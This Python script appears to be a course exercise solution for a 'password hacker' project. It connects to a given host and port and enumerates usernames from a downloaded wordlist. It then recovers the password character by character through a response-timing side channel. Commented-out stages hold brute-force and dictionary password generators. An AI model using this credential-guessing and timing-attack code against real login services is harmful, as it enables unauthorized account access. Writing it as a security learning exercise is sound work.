import json
import socket
import sys
from datetime import datetime
from pathlib import Path
from string import ascii_letters, digits

import requests

ip, port = sys.argv[1:]
port = int(port)


# 2/5
# from string import ascii_lowercase, digits
# def password_gen():
#     i = 1
#     while True:
#         for x in product(ascii_lowercase + digits, repeat=i):
#             yield ''.join(x)
#         i += 1

# 2/5
# def get_list_passwords():
#     """Get a list of password from the internet or local copy"""
#
#     if Path('passwords.txt').exists():
#         with open('passwords.txt', 'r') as f:
#             return f.read().splitlines()
#     url = 'https://stepik.org/media/attachments/lesson/255258/passwords.txt'
#     passwords = requests.get(url).content.decode('utf-8')
#     with open('passwords.txt', 'w') as f:
#         f.writelines(passwords)
#     return passwords.split()

# 4/5
def get_login_names():
    if Path('logins.txt').exists():
        with open('logins.txt', 'r') as f:
            return f.read().splitlines()
    url = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'
    logins = requests.get(url).content.decode('utf-8')
    with open('logins.txt', 'w') as f:
        f.writelines(logins)
    return logins.split()


# 4/5
def create_json_login(username, password):
    login = {'login': username, 'password': password}
    return json.dumps(login)


# 3/5
# def pswds_case_randomizer(list_pswds):
#     """Creates 2-tuples each consisting of one character in both upper and lower cases
#      and then makes a cartesian product from them to get every combination"""
#
#     for pswd in list_pswds:
#         for x in product(*((char.upper(), char.lower()) for char in pswd)):
#             yield ''.join(x)


with socket.socket() as s:
    s.connect((ip, port))
    login_found = None
    for login in get_login_names():
        data = create_json_login(login, ' ')
        s.send(data.encode('utf-8'))
        response = json.loads(s.recv(1024).decode('utf-8'))
        if response["result"] == 'Wrong password!':
            login_found = login
            break
    password_found = None
    password = ''  # MUST be out of the while loop, otherwise it gets overwritten with every iteration
    while not password_found:
        for c in ascii_letters + digits:
            curr = password + c
            data = create_json_login(login_found, curr)

            start = datetime.now()
            s.send(data.encode('utf-8'))
            raw_response = s.recv(1024).decode('utf-8')
            finish = datetime.now()
            # 5/5
            diff = finish - start

            response = json.loads(raw_response)
            result = response["result"]  # this line was above the previous one..
            if result == 'Connection success!':
                password_found = curr
                print(data)
                break
            if diff.microseconds >= 100000:  # 5/5
                password = curr
                break
